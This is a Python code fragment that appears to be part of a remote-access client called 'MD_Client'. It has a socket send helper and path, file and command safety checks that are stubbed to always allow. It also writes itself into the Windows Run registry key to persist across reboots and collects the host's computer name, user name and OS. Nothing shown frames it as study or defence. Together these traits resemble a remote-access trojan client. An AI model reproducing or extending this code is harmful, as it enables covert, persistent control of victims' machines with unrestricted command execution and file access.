def send_all(sock, data, lock=None):
    if lock:
        lock.acquire()
    try:
        total = 0
        while total < len(data):
            sent = sock.send(data[total:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total += sent
    finally:
        if lock:
            lock.release()



def _is_safe_path(path):
    """Check if path is safe for access"""
    return True

def _is_safe_file(path):
    """Check if file is safe to access - now allows all files for download"""
    return True

def _is_safe_command(command):
    """Check if command is safe to execute"""
    return True


def unique_filepath(path):
    if not os.path.exists(path):
        return path
    dirname = os.path.dirname(path)
    basename = os.path.basename(path)
    base, ext = os.path.splitext(basename)
    n = 1
    while True:
        new_name = f"{base} ({n}){ext}"
        new_path = os.path.join(dirname, new_name)
        if not os.path.exists(new_path):
            return new_path
        n += 1

def already_running():
    if sys.platform != "win32":
        return False
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        ERROR_ALREADY_EXISTS = 183
        mutex_name = "Global\\MD_Client_SingleInstance"
        handle = kernel32.CreateMutexW(None, True, mutex_name)
        if handle is None:
            return False
        err = kernel32.GetLastError()
        if err == ERROR_ALREADY_EXISTS:
            kernel32.CloseHandle(handle)
            return True
        return False
    except Exception:
        return False

def add_to_startup():
    if winreg is None:
        return False
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        key_name = "MD_Client"
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, current_file)
        
        winreg.CloseKey(key)
        
        return True
        
    except Exception as e:
        return False

def check_startup():
    if winreg is None:
        return False
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "MD_Client"
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        
        try:
            value, _ = winreg.QueryValueEx(key, key_name)
            winreg.CloseKey(key)
            
            current_file = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            if value == current_file:
                return True
            else:
                return False
                
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
            
    except Exception as e:
        return False

def ensure_startup():
    if not check_startup():
        return add_to_startup()
    return True

def get_info():
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unknown"
    return {
        "computer": platform.node(),
        "user": user,
        "os": platform.platform()
    }

